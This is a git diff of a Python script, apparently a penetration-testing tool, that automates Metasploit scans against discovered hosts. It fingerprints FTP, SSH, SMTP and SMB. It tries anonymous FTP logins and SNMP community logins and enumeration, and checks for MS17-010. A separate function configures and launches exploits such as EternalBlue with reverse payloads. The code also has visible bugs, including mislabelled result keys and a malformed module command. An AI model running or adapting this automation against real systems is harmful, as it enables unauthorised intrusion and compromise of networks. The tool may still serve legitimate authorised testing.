@@ -4,6 +4,7 @@ from web_query_and_process_script import *
 
 import pdb
 import socket
+import time
 
 ####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################
 
@@ -81,46 +82,213 @@ def script_automate_scan():
 
     @return: list data from the metasploit console, the rpc client and the console associated to this client
     '''
-    # check failure version
-    ip_version_vuln = look_for_version()
+    # dictionnary of data
+    dict_of_data = {}
+    dict_tmp = {}
+
+    # check ip_port vulnerability
+    dict_port_ip_vuln = look_for_port()
 
     # launch metasploit
     client, console = main_connection()
 
-    ####################################GET IP HOSTNAME#########################################
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    hostname = s.getsockname()[0]
-    s.close()
+    if client == -1:
+        return -1
 
     # pdb.set_trace()
     #######################################CHECK OPENED PORT####################################
-    for tuple_info in ip_version_vuln:
-        ###################################ETERNALBLUE SECTION##################################
-        if ('Microsoft Windows Server 2008 R2' or 'Windows 7') in tuple_info[2]:
+    for ip, liste_port_vuln in dict_port_ip_vuln.items():
+        ###################################LOOK FOR DATA GET##################################
+        #######CHECK PORT 21########
+        if '21' in liste_port_vuln:
+            ###############################LOOK VERSION FTP###################################
+            console.write('use auxiliary/scanner/ftp/ftp_version')
+            console.write('set RHOSTS ' + str(ip))
+            console.write('run')
+            while console.is_busy() == True:
+                time.sleep(1)
+            #############GET THE VERSION#############
+            data_version = console.read()
+            # pdb.set_trace()
+            if 'FTP Banner' in data_version['data']:
+                spliter = data_version['data'].split('\n')
+                for line in spliter:
+                    if 'FTP Banner' in line:
+                        version = line
+                        # pdb.set_trace()
+                        dict_tmp['version ftp'] = version
+            # pdb.set_trace()
+            ################################LOOK FOR ANONYMOUS LOGIN#########################
+            console.write('use auxiliary/scanner/ftp/anonymous')
+            console.write('set RHOSTS ' + str(ip))
+            console.write('run')
+            while console.is_busy() == True:
+                time.sleep(1)
+            ##############ANONYMOUS CAPABILITY CHECK##########
+            data_anonymous = console.read()
+            if 'Anonymous READ' in data_anonymous['data']:
+                console.write('ftp ' + str(ip))
+                console.write('user anonymous')
+                time.sleep(1)
+                data_anonymous = console.read()
+                if 'Login successful' in data_anonymous['data']:
+                    dict_tmp['anonymous connexion capability'] = 'true'
+                else:
+                    dict_tmp['anonymous connexion capability'] = 'false'
+            else:
+                dict_tmp['anonymous connexion capability'] = 'false'
+
+        #################################STORE FTP CHECK################################################################
+        dict_of_data['21'] = dict_tmp
+        #############RESET TMP DICT##########
+        dict_tmp = {}
+        # pdb.set_trace()
+        ##########CHECK PORT 22#########
+        if '22' in liste_port_vuln:
+            ###############################LOOK VERSION SSH###################################
+            console.write('use auxiliary/scanner/ssh/ssh_version')
+            console.write('set RHOSTS ' + str(ip))
+            console.write('run')
+            time.sleep(1)
+            #####################GET THE VERSION################
+            data_version = console.read()
+            if 'version' in data_version['data']:
+                spliter = data_version['data'].split('\n')
+                for line in spliter:
+                    if 'version' in line:
+                        version = line
+                        dict_tmp['version ssh'] = version
+            else:
+                dict_tmp['version smtp'] = 'None'
+
+            dict_tmp[
+                'infos'] = 'mind if the version is lower than 7.7, you can try to enumerate the user with a user_file.txt'
+
+        #################################STORE SSH CHECK################################################################
+        dict_of_data['22'] = dict_tmp
+        #############RESET TMP DICT##########
+        dict_tmp = {}
+
+        ########CHECK PORT 25###########
+        if '25' in liste_port_vuln:
+            ###############################LOOK VERSION SMTP###################################
+            console.write('auxiliary/scanner/smtp/smtp_version')
+            console.write('set RHOSTS ' + str(ip))
+            console.write('run')
+            while console.is_busy() == True:
+                time.sleep(1)
+            #####################GET THE VERSION################
+            data_version = console.read()
+            if 'version' in data_version['data']:
+                spliter = data_version['data'].split('\n')
+                for line in spliter:
+                    if 'version' in line:
+                        version = line
+                        dict_tmp['version smtp'] = version
+            else:
+                dict_tmp['version smtp'] = 'None'
+
+            dict_tmp[
+                'infos'] = 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service'
+
+        #################################STORE SMTP CHECK################################################################
+        dict_of_data['25'] = dict_tmp
+        #############RESET TMP DICT##########
+        dict_tmp = {}
+
+        ########CHECK PORT 161########### issue with this one (why only this module : I don't know)/  console.is_busy == false but result not yet display in the console !!! => error !!!!!!!!!
+        # pdb.set_trace() ############### this check sucks, we are forced to slow down the process
+        console.write('use auxiliary/scanner/snmp/snmp_login')
+        console.write('set RHOSTS ' + str(ip))
+        time.sleep(1)
+        console.write('set THREADS 255')
+        time.sleep(1)
+        console.write('run')
+        time.sleep(1)
+        while console.is_busy() == True:
+            time.sleep(1)
+        #####################GET THE VERSION################
+
+        data_version = console.read()
+        print(data_version)
+        id = 0
+        if 'Successful' in data_version['data']:
+            # pdb.set_trace()
+            spliter = data_version['data'].split('\n')
+            for line in spliter:
+                if 'Successful' in line:
+                    version = line
+                    dict_tmp[str(id)] = version
+                    id += 1
+            ########################################LOOK FOR ENUMERATION#################################
+            console.write('use auxiliary/scanner/snmp/snmp_enum')######### issue with this one (why only this module : I don't know)/  console.is_busy == false but result not yet display in the console !!! => error !!!!!!!!!
+            # pdb.set_trace()                                    ######### this check sucks, we are forced to slow down the process
+            if 'private' in data_version['data']:
+                console.write('set COMMUNITY private')
+            else:
+                console.write('set COMMUNITY public')
+            time.sleep(1)
+            console.write('set RHOSTS ' + str(ip))
+            time.sleep(1)
+            console.write('set THREADS ' + str(255))
+            time.sleep(1)
+            console.write('run')
+            time.sleep(1)
+            while console.is_busy() == True:
+                time.sleep(3)
+            ###############ENUMERATION RECUP################
+            data_version = console.read()
+            # pdb.set_trace()
+            dict_tmp['data'] = data_version['data']
+
+        else:
+            dict_tmp['data'] = 'None'
+
+        #################################STORE SNMP CHECK################################################################
+        dict_of_data['161'] = dict_tmp
+        #############RESET TMP DICT##########
+        dict_tmp = {}
+
+        ########CHECK PORT 445###########
+        if '445' in liste_port_vuln:
+            console.write('use scanner/smb/smb_version')
+            console.write('set RHOSTS ' + str(ip))
+            console.write('run')
+            time.sleep(1)
+            #####################GET THE VERSION################
+            data_version = console.read()
+            if 'running' in data_version['data']:
+                spliter = data_version['data'].split('\n')
+                for line in spliter:
+                    if 'running' in line:
+                        version = line
+                        dict_tmp['version smtp'] = version
+            dict_tmp[
+                'infos'] = 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service ; also, if the systeme is linux, try exploit/linux/samba/is_known_pipename'
+
+            #####################CHECK MS17 VULN#################
             auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
             exploit_name = 'windows/smb/ms17_010_eternalblue'
-
-            ######################################GET IP VULN FOR 445###############################
-
-            vuln_ip_smb = tuple_info[0]
-
             ######################################AUXILIARY SCAN####################################
             data_read_out = []
-            data_console = main_enter_console_for_scan(auxiliary_scan, vuln_ip_smb, console)
+            data_console = main_enter_console_for_scan(auxiliary_scan, ip, console)
             # pdb.set_trace()
             if data_console != -1:
                 if 'Host is likely VULNERABLE to MS17-010!' in data_console['data']:
                     data_read_out.append(
-                        'ip : ' + vuln_ip_smb + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
+                        'ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
                 elif 'OptionValidateError' in data_console['data']:
                     data_read_out.append(
-                        'ip : ' + vuln_ip_smb + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
+                        'ip : ' + str(ip) + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
+                dict_tmp['ms17'] = data_read_out
+            else:
+                dict_tmp['ms17'] = 'None'
 
-                # if '8020' in opened_vuln_port:
+        ########CHECK PORT
 
-                return data_read_out, client, console
 
+        dict_of_data['445'] = dict_tmp
+        return dict_of_data
     return -1
 
 
@@ -204,7 +372,7 @@ def get_board_exploit(client):
 
 
 def brute_force_exploit(board_of_exploit, client):
-    #!!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
+    # !!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
     ####global variable####
     global session_key_client
 
@@ -225,16 +393,16 @@ def brute_force_exploit(board_of_exploit, client):
                     #############################################CONFIG EXPLOIT###################################
                     exploit_running = main_run_exploit(exploit, client)
                     payload = None
-                    for arg, value in dico_config.items() :
+                    for arg, value in dico_config.items():
                         if arg == 'RHOSTS':
                             main_change_option_exploit(arg, ip, 'STR', exploit_running)
                         if arg == 'CheckModule':
                             main_change_option_exploit(arg, dico_config[arg], 'STR', exploit_running)
                         if arg == 'RPORT':
                             main_change_option_exploit(arg, port, 'STR', exploit_running)
-                        if arg =='Payload':
+                        if arg == 'Payload':
                             payload = main_choose_payload(dico_config[arg], client)
-                        if arg =='LHOST' and payload is not None:
+                        if arg == 'LHOST' and payload is not None:
                             main_config_payload(arg, hostname, 'STR', payload)
                         # print(exploit_running.runoptions)
                     ############################################RUN EXPLOIT######################################
@@ -338,3 +506,5 @@ def brute_force_exploit(board_of_exploit, client):
 # }
 # print(brute_force_exploit(board, client))
 #
+
+print(script_automate_scan())
